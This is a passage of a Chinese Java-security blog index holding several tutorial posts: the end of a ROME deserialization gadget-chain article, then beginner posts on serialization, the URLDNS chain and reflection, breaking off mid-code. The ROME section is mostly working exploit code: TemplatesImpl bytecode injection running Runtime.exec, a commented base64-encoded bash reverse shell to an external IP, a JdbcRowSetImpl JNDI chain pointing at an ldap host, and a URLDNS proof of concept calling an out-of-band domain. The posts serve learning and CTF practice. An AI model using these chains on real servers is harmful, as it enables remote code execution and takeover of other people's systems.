com.sun.syndication.feed.impl.EqualsBean;  \nimport com.sun.syndication.feed.impl.ToStringBean;  \nimport javassist.ClassPool;  \nimport javassist.CtClass;  \nimport javassist.CtConstructor;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.util.HashMap;  \n  \npublic class RomEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n        setFieldValue(templates,\"_name\",\"Drunkbaby\");  \n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());  \n        Class c = templates.getClass();  \n        Field byteCodesField = c.getDeclaredField(\"_bytecodes\");  \n        byteCodesField.setAccessible(true);  \n        byte[] evil = getTemplatesImpl(\"Calc\");  \n        byte[][] codes = &#123;evil&#125;;  \n        byteCodesField.set(templates,codes);  \n//        templates.newTransformer();  \n \t\tToStringBean toStringBean = new ToStringBean(c,templates);  \n//        toStringBean.toString();  \n \t\tClass toStringBeanEvil = toStringBean.getClass();  \n        EqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);  \n        HashMap hashMap = new HashMap();  \n        hashMap.put(equalsBean,\"Drunkbaby\");  \n        serialize(hashMap);  \n        unserialize(\"ser.bin\");  \n  \n    &#125;  \n  \n    public static byte[] getTemplatesImpl(String cmd) &#123;  \n        try &#123;  \n            ClassPool pool = ClassPool.getDefault();  \n            CtClass ctClass = pool.makeClass(\"Evil\");  \n            CtClass superClass = pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\");  \n            ctClass.setSuperclass(superClass);  \n            CtConstructor constructor = ctClass.makeClassInitializer();  \n            constructor.setBody(\" try &#123;\\n\" +  \n                    \" Runtime.getRuntime().exec(\\\"\" + cmd +  \n                    \"\\\");\\n\" +  \n                    \" &#125; catch (Exception ignored) &#123;\\n\" +  \n                    \" &#125;\");  \n            // \"new String[]&#123;\\\"/bin/bash\\\", \\\"-c\\\", \\\"&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\\"&#125;\"  \n \t\t\tbyte[] bytes = ctClass.toBytecode();  \n            ctClass.defrost();  \n            return bytes;  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n            return new byte[]&#123;&#125;;  \n        &#125;  \n    &#125;  \n  \n    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception &#123;  \n        Class clazz = object.getClass();  \n        Field field = clazz.getDeclaredField(fieldName);  \n        field.setAccessible(true);  \n        field.set(object,value);  \n    &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n        oos.writeObject(obj);  \n    &#125;  \n  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n        Object obj = ois.readObject();  \n        return obj;  \n    &#125;  \n&#125;\n\n\n\n至此，关于 ROME 的部分就到此结束了，我们可以把它的这条链子和其他利用链结合一下\n0x04 其他利用链ObjectBean 替换 EqualsBean用 ObjectBean 来替换 EqualsBean，代码基本不变，变了这一句：\nObjectBean objectBean = new ObjectBean(toStringBeanEvil,toStringBean);  \nHashMap hashMap = new HashMap();  \nhashMap.put(objectBean,\"Drunkbaby\");\n\n其余都是一样，代码已同步至 Github\n\n\nHashTable 替换入口的 HashMap这和之前讲的 CC 链子大同小异，相对应的，我们这里不进行 put() 操作，在 HashTable 里面，对于 HashTable 中的每个元素，都会调用 reconstitutionPut() 方法\n所以 EXP 改造一下如下\nHashtable hashtable= new Hashtable();  \nhashtable.put(equalsBean,\"Drunkbaby\");  \nserialize(hashtable);\n\n\n\nBadAttributeValueExpException 利用链如果师傅们对 CC 链较为熟悉的话，提起 toString()，很容易能够想到 BadAttributeValueExpException 这个类。在其 readObject() 中能够调用任意类的 toSrting() 方法。\n我们可以过去看一看\n\n\n改造 EXP 如下\nBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);  \nserialize(badAttributeValueExpException);  \nunserialize(\"ser.bin\");\n\n\n\nJdbcRowSetImpl 利用链这条链子和之前的没关系，产生漏洞是因为当时链尾的时候的调用任意 getter 方法。一开始我们是去调用 TemplatesImpl#getOutputProperties() 的，现在我们用 JdbcRowSetImpl 这条链子\n关于这条链子分析比较简单，它的触发点是在 getDatabaseMetaData() 方法处，它调用了 connect() 方法\n\n\n后续的就是一个 Jndi 注入的，原理在 Fastjson 篇已经说的很清楚了，这里不再赘述。\n构造 EXP\npublic class JdbcRowSetImplEXP &#123;\n\n    public static void main(String[] args) throws Exception &#123;\n        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();\n        // EXP为我们的恶意类\n        String url = \"ldap://127.0.0.1:1230/ExportObject\";\n        jdbcRowSet.setDataSourceName(url);\n\n\n        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);\n        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);\n\n        HashMap&lt;Object,Object> hashMap = new HashMap&lt;>();\n        hashMap.put(equalsBean, \"123\");\n\n        serialize(hashMap);\n        unserialize(\"ser.bin\");\n    &#125;\n\n    public static void setValue(Object obj, String name, Object value) throws Exception&#123;\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    &#125;\n\n    public static void serialize(Object obj) throws IOException &#123;\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    &#125;\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));\n        Object obj = ois.readObject();\n        return obj;\n    &#125;\n&#125;\n\n开启 LDAP 以及恶意类，复现成功\n\n\n\n\n优化利用链最开始的 EXP 里面，在给 HashMap 赋值的时候，会使用 put() 方法，最终也会调用一次 key.hashcode()，这就和 URLDNS 链子是一样的\n\n按照之前的思维，让它在反序列化的之前，HashMap.put() 之后用反射进行值的动态改变即可。\n\nhashMap.put(\"key\",\"Drunkbaby\");  \nserialize(hashMap);  \nsetFieldValue(hashMap,\"value\",equalsBean);  \nunserialize(\"ser.bin\");\n\n\n\n\n0x05 关于 payload 长度的精简由于杰哥的指点，这里发现可以用 javassist 缩短 payload 长度，这样可以跳过恶意类的编译过程，上述代码都是用 javassist 生成的恶意字节码，所以这里不再展开。\n0x06 例题 ———— 2022 长城杯 b4bycoffee\n比较简单，分析在这里就不写了，直接挂个 EXP，这里踩了很多的坑，后面非常感谢 F1or 师傅帮我看了一下，确实只是因为踩了个坑\n\n关于题目解析可以看这个仓库里面的 WP\nDrun1baby&#x2F;CTFReposityStore\n0x07 小结ROME 链还是比较简单的，最近有点迷茫了\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化基础篇-01-反序列化概念与利用","url":"/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/","content":"Java反序列化基础篇 (一) 反序列化概念与基础利用视频可以参考 ———— 白日梦组长的视频 Java反序列化漏洞专题；当时个人也是从这里学到了很多\n\nJava反序列化基础篇0x01 前言\n写这篇文章，是想在 Java 反序列化基础的地方再多过几遍，毕竟万丈高楼平地起。\n\n我是非常不建议新手们一上来就开始分析 CC 链，就开始看 shiro 的 POC 的，我觉得还是得先打好基础。\n\n人人都会走弯路，但是要尽量少走弯路，这也是我写这篇文章由衷的目的，希望师傅们学习过程中可以少走弯路。\n\n先学好基础，为后续的 Java 安全学习做好铺垫。\n这里强推大家先去了解一下 Java 的反射是什么，力推 “Java 安全漫谈系列“，师傅们可以加入 “Java 代码审计“ 的知识星球。\n0x02 序列化与反序列化1. 什么是序列化与反序列化\n之前也刷了 Port，对于序列化和反序列化还是清楚的，这里不厌其烦，再写一遍，也让自己再过一遍。\n\n\n序列化：对象 -&gt; 字符串反序列化：字符串 -&gt; 对象\n\n2. 为什么我们需要序列化与反序列化\n一开始学的时候还是不知道的。\n\n序列化与反序列化的设计就是用来传输数据的。\n当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。\n序列化的好处(1) 能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。\n(2) 利用序列化实现远程通信，在网络上传送对象的字节序列。\n序列化与反序列化应用的场景(1) 想把内存中的对象保存到一个文件中或者是数据库当中。(2) 用套接字在网络上传输对象。(3) 通过 RMI 传输对象的时候。\n3. 几种创建的序列化和反序列化协议XML&amp;SOAPJSONProtobuf\n\n当今 Java 原生当中的序列化与反序列化其实用的比较少吧，但是我们最开始讲起的话还是从原生开始讲起。\n\n0x03 序列化与反序列化代码实现先创建几个文件，这里要避免踩个坑\n踩坑小记 —— IDEA 右键新建时没有 Java Class 选项异常现象如图\n\n解决\n\n还有一种情况是你以数字命名文件夹了，比如 “001” 这种，是不行的\n1. 代码展示，便于大家 Copy 省时间\n类文件：Person.java\n\npackage src;  // 修改成自己的 Package 路径\n  \nimport java.io.Serializable;  \n  \npublic class Person implements Serializable &#123;  \n  \n    private String name;  \n private int age;  \n  \n public Person()&#123;  \n  \n    &#125;  \n    // 构造函数  \n public Person(String name, int age)&#123;  \n        this.name = name;  \n this.age = age;  \n &#125;  \n  \n    @Override  \n public String toString()&#123;  \n        return \"Person&#123;\" +  \n                \"name='\" + name + '\\'' +  \n                \", age=\" + age +  \n                '&#125;';  \n &#125;  \n&#125;\n\n\n序列化文件 SerializationTest.java\n\npackage src;  \n  \n  \nimport java.io.FileOutputStream;  \nimport java.io.IOException;  \nimport java.io.ObjectOutput;  \nimport java.io.ObjectOutputStream;  \n  \npublic class SerializationTest &#123;  \n    public static void serialize(Object obj) throws IOException&#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n  \n    public static void main(String[] args) throws Exception&#123;  \n        Person person = new Person(\"aa\",22);  \n \t\tSystem.out.println(person);  \n  \t\tserialize(person);  \n &#125;  \n&#125;\n\n\n反序列化文件 UnserializeTest.java\n\npackage src;  \n  \nimport java.io.FileInputStream;  \nimport java.io.IOException;  \nimport java.io.ObjectInputStream;  \n  \npublic class UnserializeTest &#123;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n  \n    public static void main(String[] args) throws Exception&#123;  \n        Person person = (Person)unserialize(\"ser.bin\");  \n System.out.println(person);  \n &#125;  \n&#125;\n\n2. 序列化与反序列化的代码讲解基本实现这里我们可以先跑一跑代码，看一看。\nRun SerializationTest.java\n\n\nRun UnserializationTest.java\n\n\n\n前文我们说，序列化与反序列化的根本目的是数据的传输。\n\n\nSerializationTest.java\n\n这里我们将代码进行了封装，将序列化功能封装进了 serialize 这个方法里面，在序列化当中，我们通过这个 FileOutputStream 输出流对象，将序列化的对象输出到 ser.bin 当中。再调用 oos 的 writeObject 方法，将对象进行序列化操作。\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \noos.writeObject(obj);\n\n\nUnserializeTest.java\n\n进行反序列化\nObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \nObject obj = ois.readObject();\n\nSerializable 接口(1) 序列化类的属性没有实现 Serializable 那么在序列化就会报错只有实现 了Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）\nSerializable 接口是 Java 提供的序列化接口，它是一个空接口，所以其实我们不需要实现什么。\npublic interface Serializable &#123;\n&#125;\n\nSerializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。如果我们此处将 Serializable 接口删除掉的话，会导致如下结果。\n\n\n(2) 在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象。(3)一个实现 Serializable 接口的子类也是可以被序列化的。(4) 静态成员变量是不能被序列化序列化是针对对象属性的，而静态成员变量是属于类的。\n(5) transient 标识的对象成员变量不参与序列化这里我们可以动手实操一下，将 Person.java 中的 name 加上 transient 的类型标识。加完之后再跑我们的序列化与反序列化的两个程序，修改过程与运行结果如图所示。\n\n\n\n上述说的还是关于序列化本身的一些特性，接下来我们讲一讲序列化的安全问题是如何产生的。\n0x04 为什么会产生序列化的安全问题1. 引子\n序列化与反序列化当中有两个 “特别特别特别特别特别” 重要的方法 ———— writeObject 和 readObject。\n\n这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。\n\n举个例子，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是重写以下两个 private 方法：\n\nprivate void writeObject(java.io.ObjectOutputStream s)throws java.io.IOException\nprivate void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundException\n\n只要服务端反序列化数据，客户端传递类的 readObject 中代码会自动执行，基于攻击者在服务器上运行代码的能力。\n\n所以从根本上来说，Java 反序列化的漏洞的与 readObject 有关。\n\n2. 可能存在安全漏洞的形式(1) 入口类的 readObject 直接调用危险方法\n这种情况呢，在实际开发场景中并不是特别常见，我们还是跟着代码来走一遍，写一段弹计算器的代码，文件 ———— “Person.Java“\n\n\n\n先运行序列化程序 ———— “SerializationTest.java“，再运行反序列化程序 ———— “UnserializeTest.java“\n这时候就会弹出计算器，也就是 calc.exe，是不是帅的飞起哈哈。\n这是黑客最理想的情况，但是这种情况几乎不会出现。\n(2) 入口参数中包含可控类，该类有危险方法，readObject 时调用(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用(4) 构造函数&#x2F;静态代码块等类加载时隐式执行3. 产生漏洞的攻击路线首先的攻击前提：继承 Serializable\n入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）\n找到入口类之后要找调用链 gadget chain 相同名称、相同类型\n执行类 sink （RCE SSRF 写文件等等）比如 exec 这种函数\n\n这里看不懂先不要紧，后续看到 URLDNS 利用链的复现就会悟了哈哈，我当时这里也看不懂，后面悟了。\n\n以 HashMap 为例说明一下，仅仅只是说明如何找到入门类\n我这里逐个给大家过一遍，以 HashMap 为例进行说明。\n\n首先，攻击前提，那必然是要继承了 Serializable 这个接口，要不然谈何序列化与反序列化对吧。\nHashMap 确实继承了 Serializable 这个接口。\n\n\n入口类这里比较难懂，还是以 HashMap 为例吧，这些步骤是要自己动手实操一下的，不然体验感很差。\n打开 “Structure”，找到重写的 readObject，往下分析。\n\n\n我们看到第 1416 行与 1418 行中，Key 与 Value 的值执行了 readObject 的操作，再将 Key 和 Value 两个变量扔进 hash 这个方法里，我们再跟进(ctrl+鼠标左键即可) hash 当中。\n\n\n\n若传入的参数 key 不为空，则 h = key.hashCode()，于是乎，继续跟进 hashCode 当中。\n\nhashCode 位置处于 Object 类当中，满足我们 调用常见的函数 这一条件。\n实战 ———— URLDNS\n出发点：URLDNS 在 Java 复杂的反序列化漏洞当中足够简单；URLDNS 就是 ysoserial 中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次 DNS 请求。\n\n虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤。\n\n使⽤ Java 内置的类构造，对第三⽅库没有依赖。\n\n在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 URL 类，调用 openConnection 方法，到此处的时候，其实 openConnection 不是常见函数，就已经难以利用了。\n\n\n\n\n我们先去到 ysoserial 的项目当中，去看看它是如何构造 URLDNS 链的。ysoserial&#x2F;URLDNS.java at master · frohoff&#x2F;ysoserial (github.com)\n\n\nysoserial 对 URLDNS 的利用链看着无比简单，就这么几行代码。\nGadget Chain:\n\tHashMap.readObject()\n\t\tHashMap.putVal()\n\t\t\tHashMap.hash()\n\t\t\t\tURL.hashCode()\n\n再来开始自己复现一遍 URLDNS 的利用链。\n初步复现URL 是由 HashMap 的 put 方法产生的，所以我们先跟进 put 方法当中。put 方法之后又是调用了 hash 方法；hash 方法则是调用了 hashcode 这一函数。\n\n\n还记得前文最看不懂的地方吗？我当时说这一块不懂不要紧，看到 URLDNS 的复现就懂了。\n我们看到这个 hashCode 函数的变量名是 key；那这个 key 是啥啊？噢 ~ 原来 key 是 hash 这一方法传进的参数！那我们前面写的 key 不就是这个东东吗 ~！\nhashmap.put(new URL(\"DNS生成的 URL，用dnslog就可以\"),1);\n\n// 传进去两个参数，key = 前面那串网址，value = 1\n\n所以这里，我们跟进 URL，去看看 URL 跟进一堆之后的 hashCode 方法是如何实现的。\n跟进 URL，我们肯定是要去寻找 URL 调用的函数的函数（的函数，应该还有好几个的函数，就不写出来了，不然大家就晕了）的 hashCode 方法。\n在左边 Structure 直接寻找 hashCode 方法，URL 中的 hashCode 被 handler 这一对象所调用，handler 又是 URLStreamHandler 的抽象类。我们再去找 URLStreamHandler 的 hashCode 方法。\n\n\n终于找到了，这个用于 URLDNS 的方法 ———— getHostAddress\n\n\n再跟进 getHostAddress\n\n\n这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。\n\n所以，⾄此，整个 URLDNS 的Gadget其实清晰⼜简单：\n\n\nHashMap-&gt;readObject()\n\nHashMap-&gt;hash()\n\nURL-&gt;hashCode()\n\nURLStreamHandler-&gt;hashCode()\n\nURLStreamHandler-&gt;getHostAddress()\n\nInetAddress-&gt;getByName()\n\n\n半路杀出个程咬金\n我们的复现步骤：\n\nSerializationTest.java 文件下添加如下代码\nHashMap&lt;URL,Integer> hashmap= new HashMap&lt;URL,Integer>();   \nhashmap.put(new URL(\"DNS生成的 URL，用dnslog就可以\"),1);\n\nserialize(hashmap);\n\n\n\n我们先把它序列化，按照道理来说，这个过程应该什么都不会发生对吧。\n\n\n很奇怪，为什么却能收到 URLDNS 的请求？？？？那我们的视线很容易就被干扰了呀，无法判断到底是因为反序列化的 URLDNS ，还是因为序列化的过程中的 URLDNS。\n把程咬金给办了！还是从原理角度分析，我们回到 URL 这个对象，回到 hashCode 这里。\n\n\n我们发现，当 hashCode 的值不等于 -1 的时候，函数就会直接 return hashCode 而不执行 hashCode = handler.hashCode(this);。而一开始定义 HashMap 类的时候hashCode 的值为 -1，便是发起了请求。\n所以我们在没有反序列化的情况下面，就收到了 DNS 请求，这是不正确的。\n那要如何才能把 “半路杀出的程咬金” 给办了呢？我们大致有这样一个思路。\n\n\n有关反射的知识又是一个很庞大的体系了，我们下篇文章再讲 ~这里我先把 Poc 挂出来。\nURLDNS 反序列化利用链的 POC根据我们的思路，将 Main 函数进行修改，我这里直接全部挂出来了，不然师傅们容易看错。\nSerializationTest.java\npublic static void main(String[] args) throws Exception&#123;  \n Person person = new Person(\"aa\",22);  \n HashMap&lt;URL,Integer> hashmap= new HashMap&lt;URL,Integer>();  \n // 这里不要发起请求  \n URL url = new URL(\"http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com\"); \n Class c = url.getClass();  \n Field hashcodefile = c.getDeclaredField(\"hashCode\");  \n hashcodefile.setAccessible(true);  \n hashcodefile.set(url,1234);  \n hashmap.put(url,1);  \n // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  \n hashcodefile.set(url,-1);  \n serialize(hashmap);  \n&#125;\n\n反序列化的文件无需更改\n接着我们运行序列化文件，是收不到 DNS 请求的，而当我们运行反序列化的文件时候，可以收到请求，这就代表着我们的 URLDNS 链构造成功了。\n\n\n\n0x05 小结与后续展望其实看了很多的反序列化教程，自己写这篇文章也是为了大家能够少走弯路吧，我们分析下来，一个最简单的 URLDNS 对于刚入门的师傅们来说也是比较难以理解与分析的，我本人也是学了好几天才啃下来的。\n相对于一开始就接触 CC 链，或者是其他 Tomcat，shiro 漏洞复现的就更甚了，不懂原理只当一个脚本小子对个人的提升意义并不是很大。\n\n后续的一些展望\n\n师傅们若是对 Java 安全感兴趣的话可以关注我 ~后续还会继续更新相关自己的学习笔记的。\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化基础篇-02-Java反射与URLDNS链分析","url":"/2022/05/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-02-Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/","content":"Java 反射与 URLDNS 链分析\n\nJava反序列化基础篇-02-Java 反射与 URLDNS 链分析代码详见上一篇文章Java反序列化基础篇-01-反序列化概念与利用\n\n切记，反射只是一种攻击的中间手段而不是最终的手段。\n\n真正的攻击思路还是我们上篇文章里讲的\n首先的攻击前提：继承 Serializable\n入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）\n找到入口类之后要找调用链 gadget chain 相同名称、相同类型\n执行类 sink （RCE SSRF 写文件等等）比如 exec 这种函数\n0x01 前言\n书接上文，我们在上文当中详细介绍了 Java 反序列化的一些基础性的知识，到最后分析了 URLDNS 链的利用。但是离最后的 POC 我们还差一步之遥。\n\nURLDNS 的链想要成功构造，必须要懂反射，而本篇文章中，我会细致地带大家入门 Java 反射。\n引用 P神 的一句话\n\nJava 安全可以从反序列化说起，而反序列化可以从反射说起。\n\n0x02 反射理解\n反射的作用：让 Java 具有动态性\n\nJava 的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法； 并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为 Java 语言的反射机制。\nJava 本身是一种静态语言，为什么这么说，看这一段代码就知道了。\nStudent student = new Student();\n\n那反过来，什么是动态语言呢？PHP 本身就拥有很多动态特性，我们来看这一段代码。在这一段代码里面，我们输入 eval，php 就执行 eval 命令；输入 echo 就执行 echo 命令；这就是语言的动态特性。\neval(&lt;?php eval()?>)\n1. 正射与反射\n提一嘴正射与反射的概念是为了让大家能够更好的理解 Java 反射。\n\n正射我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。\nStudent student = new Student();\nstudent.doHomework(\"数学\");\n\n反射反射就是，一开始并不知道我们要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。我们以这一段经典的反射代码为例说明。\n还记得我们第一课讲的 Person.java 文件吗？我们这里新建一个 ReflectionTest.java 文件，并在其中添加如下代码。\npublic static void main(String[] args) throws Exception&#123;  \n    Person person = new Person();  \n \tClass c = person.getClass();\n&#125;\n\n\n我们注意到在代码块中出现了大写 C 开头的 Class；\n\n理解反射的第一步就必须先搞清楚 Class 是什么。\n\n2. Java Class 对象理解我们程序在运行的时候会编译生成一个 .class 文件，而这个 .class 文件中的内容就是相对应的类的所有信息，比如这段程序当中：\npublic static void main(String[] args) throws Exception&#123;  \n    Person person = new Person();  \n \tClass c = person.getClass();\n&#125;\n\n其实 **person.class 就是 Class**，Class 也就是描述类的类。\nClass 类的对象作用是运行时提供或获得某个对象的类型信息。\n\n所以反射其实就是操作 Class，看清楚了，是大 C\n\n0x03 Java 反射组成相关的类反射机制相关操作一般位于java.lang.reflect包中。\n而java反射机制组成需要重点注意以下的类：\njava.lang.Class：类对象;\njava.lang.reflect.Constructor：类的构造器对象;\njava.lang.reflect.Field：类的属性对象;\njava.lang.reflect.Method：类的方法对象;\n0x04 Java 反射使用方法 前文铺垫了那么多的基础知识，所以我们的 Java 反射该如何利用与实现，又该如何辅助我们帅气的 **弹shell **呢？ \n获取类的方法：forName\n实例化类对象的方法：newInstance\n获取函数的方法：getMethod\n执行函数的方法：invoke\n1. 首先需要实例化对象对于普通用户我们可以采用以下方法创建实例：\nPerson test = new Person();\n而我们在创建 Class 类的实例对象却不能使用上述方法，运行会抛出错误\nClass test = new Class();\n\n\n\n同时我们可以跟进 Class 类的源码进行查看，发现其构造器是私有的，所以只有 JVM 能够创建 Class 对象。\n\n\n因为 Class 类是 private 私有属性，我们也无法通过创建对象的方式来获取 class 对象，那么我们怎样才能够获取到 class 对象呢？一般我们获取 class 对象就有以下三种方法，我们来逐一看看。\n方法一、实例化对象的getClass()方法如果上下⽂中存在某个类的实例 obj，那么我们可以通过 obj.getClass 来获取它的类。\nTestReflection testReflection = new TestReflection();\nClass class3 = testReflection.getClass();\n\n方法二、 使用类的 .class 方法如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。\nClass class2 = TestReflection.class;\n\n方法三、Class.forName(String className)：动态加载类如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取，后续要利用的话是需要实例化的。\nClass class1 = Class.forName(\"reflection.TestReflection\");\n\n\n我们可以写个简单的示例代码，分别利用这三种方法获取当前类Class对象的当前类名。\nReflectionTest01.java\npackage src;  \n  \npublic class ReflectionTest01 &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        // 类的 .class 属性  \n Class c1 = Person.class;  \n System.out.println(c1.getName());  \n  \n // 实例化对象的 getClass() 方法  \n Person person = new Person();  \n Class c2 = person.getClass();  \n System.out.println(c2.getName());  \n  \n // Class.forName(String className): 动态加载类  \n Class c3 = Class.forName(\"src.Person\");  \n System.out.println(c3.getName());  \n  \n &#125;  \n&#125;\n\n\n\n当时学的时候这里挺疑惑的，就总想着用反射直接攻击别人，其实这是挺不靠谱的。问了好多师傅们，都说反射只是一种手段，后面看了狂神的视频之后才醒悟过来，发现反射确实只是一种手段。而最后的攻击的 gadget chain 还是要自己构造的 ~\n下面讲的三种，都是获取类里面的东西。\n2. 获取成员变量 Field获取成员变量Field位于 java.lang.reflect.Field 包中\nField[] getFields() ：获取所有 public 修饰的成员变量\nField[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符\nField getField(String name) 获取指定名称的 public 修饰的成员变量\nField getDeclaredField(String name) 获取指定的成员变量\n3. 获取成员方法 Method\n要注意以下，第一个参数是传参，第二个参数是确定重载的是哪个函数。\n\nMethod getMethod(String name, 类&lt;?>... parameterTypes) //返回该类所声明的public方法\n\nMethod getDeclaredMethod(String name, 类&lt;?>... parameterTypes) //返回该类所声明的所有方法\n\n//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型\n\nMethod[] getMethods() //获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法\n\nMethod[] getDeclaredMethods() // 获取该类中的所有方法\n\n在 Person.java 中添加如下代码\npublic void study(String s) &#123;  \n    System.out.println(\"学习中...\" + s);  \n&#125;  \nprivate String sleep(int age) &#123;  \n    System.out.println(\"睡眠中...\" + age);  \n return \"sleep\";  \n&#125;\n\n并在 ReflectionTest02.java 中添加如下\npackage src;  \n  \nimport com.sun.xml.internal.ws.encoding.MtomCodec;  \n  \nimport java.lang.reflect.Method;  \n  \npublic class ReflectionTest02 &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Class c1 = Class.forName(\"src.Person\");// 创建 Class 对象  \n Method[] methods1 = c1.getDeclaredMethods();// 获取所有该类中的所有方法  \n Method[] methods2 = c1.getMethods();// 获取所有的 public 方法，包括类自身声明的 public 方法，父类中的  、实现的接口方法  \n  \n for (Method m:methods1)&#123;  \n            System.out.println(m);  \n &#125;  \n        System.out.println(\"-------分割线---------\");  \n  \n for (Method m:methods2) &#123;  \n            System.out.println(m);  \n &#125;  \n  \n        System.out.println(\"-------分割线---------\");  \n  \n Method methods3 = c1.getMethod(\"study\", String.class);// 获取 Public 的 study 方法  \n System.out.println(methods3);  \n System.out.println(\"-------分割线---------\");  \n  \n Method methods4 = c1.getDeclaredMethod(\"sleep\", int.class); // 获取 Private 的 sleep 方法  \n System.out.println(methods4);  \n &#125;  \n  \n&#125;\n\n运行结果\n\n\n4. 获取构造函数 ConstructorConstructor&lt;?>[] getConstructors() ：只返回public构造函数\n\nConstructor&lt;?>[] getDeclaredConstructors() ：返回所有构造函数\n\nConstructor&lt;> getConstructor(类&lt;?>... parameterTypes) : 匹配和参数配型相符的public构造函数\n\nConstructor&lt;> getDeclaredConstructor(类&lt;?>... parameterTypes) ： 匹配和参数配型相符的构造函数\n\n在 forName 之后获取构造函数\n\n新建一个文件 PersonConstructor.java\n\npackage src;  \n  \nimport java.io.Serializable;  \n  \npublic class PersonConstructor &#123;  \n  \n    private String name;  \n private int age;  \n  \n // 无参构造  \n public PersonConstructor()&#123;  \n  \n    &#125;  \n    // 构造函数  \n public PersonConstructor(String name, int age)&#123;  \n        this.name = name;  \n this.age = age;  \n &#125;  \n    // 私有构造函数  \n private PersonConstructor(String name)&#123;  \n        this.name = name;  \n &#125;  \n  \n    @Override  \n public String toString()&#123;  \n        return \"Person&#123;\" +  \n                \"name='\" + name + '\\'' +  \n                \", age=\" + age +  \n                '&#125;';  \n &#125;  \n  \n&#125;\n\nReflectionTest03.java\npackage src;  \n  \nimport java.lang.reflect.Constructor;  \n  \npublic class ReflectionTest03 &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Class c1 = Class.forName(\"src.PersonConstructor\");  \n Constructor[] constructors1 = c1.getDeclaredConstructors();  \n Constructor[] constructors2 